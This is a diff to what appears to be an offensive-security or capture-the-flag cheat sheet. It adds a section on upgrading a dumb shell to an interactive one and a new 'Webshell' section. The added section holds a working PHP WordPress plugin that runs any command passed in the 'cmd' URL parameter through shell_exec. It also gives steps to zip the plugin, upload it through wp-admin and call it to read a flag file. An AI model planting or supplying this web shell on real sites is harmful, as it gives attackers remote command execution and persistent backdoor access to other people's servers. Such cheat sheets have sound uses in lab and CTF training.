@@ -22,6 +22,7 @@
   * [Error based SQL Injection](#error-based-sql-injection)
   * [Filter bypass](#filter-bypass)
 * [Dumb Shell to Fully Interactive Shell](#dumb-shell-to-fully-interactive-shell)
+* [Webshell](#Webshell)
 
 # Enumeration
 
@@ -386,11 +387,34 @@ reference: [https://portswigger.net/support/sql-injection-bypassing-common-filte
 
 # Dumb Shell to Fully Interactive Shell
 
-``` bash
+~~~ bash
 script /dev/null -c bash
 # Ctrl + z
 stty -raw echo; fg
 # Enter (Return) x2
 reset
 xterm-256color
-```
+~~~
+
+# Webshell
+
+## Wordpress plugin
+
+~~~ php
+// wordpress-webshell.php
+<?php
+/*
+Plugin Name: WebShell
+*/
+if(isset($_GET['cmd'])){
+  echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+}
+?>
+~~~
+
+~~~ shell
+zip wordpress-webshell.zip wordpress-webshell.php
+# upload plugin(http://target/wp-admin/plugin-install.php)
+# http://target/wp-content/plugins/wordpress-webshell/wordpress-webshell.php?cmd=cat%20/tmp/flag
+~~~
+
